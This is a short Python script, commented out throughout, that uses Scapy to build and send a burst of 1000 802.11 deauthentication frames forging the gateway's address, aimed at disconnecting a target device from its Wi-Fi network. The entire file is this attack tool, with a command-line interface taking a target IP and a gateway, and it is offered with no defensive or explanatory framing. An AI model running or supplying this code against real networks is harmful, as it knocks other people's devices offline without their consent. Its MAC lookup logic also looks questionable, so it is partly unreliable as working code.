# 


######


# from scapy.all import conf, getmacbyip, Dot11, Dot11Deauth, RadioTap, sendp

# import argparse

# # print(get_if_addr(conf.iface))
# # print(conf.route.route('0.0.0.0')[2])
# # print(getmacbyip(conf.route.route('0.0.0.0')[2]))

# def deeauth(target, gateway):
#     target = getmacbyip(conf.route.route(target)[2])
#     gateway = getmacbyip(conf.route.route(gateway)[2])

#     #create deauthentication packets
#     dot11 = Dot11(type=0, subtype=12, addr1=target, addr2=gateway, addr3=gateway)
#     packet = RadioTap()/dot11/Dot11Deauth(reason=7)

#     #send the packets
#     sendp(packet, inter=0.1, count=1000, verbose=1)


# if __name__ == '__main__':
#     parser = argparse.ArgumentParser('Python Script to De-authorized Connected Devices.')
#     parser.add_argument('target_ip', help='Target Ip to scan.')
#     parser.add_argument('gateway', help='Target gateway or router')

#     args =parser.parse_args()

#     target = args.target_ip
#     gateway = args.gateway

#     deeauth(target,gateway)
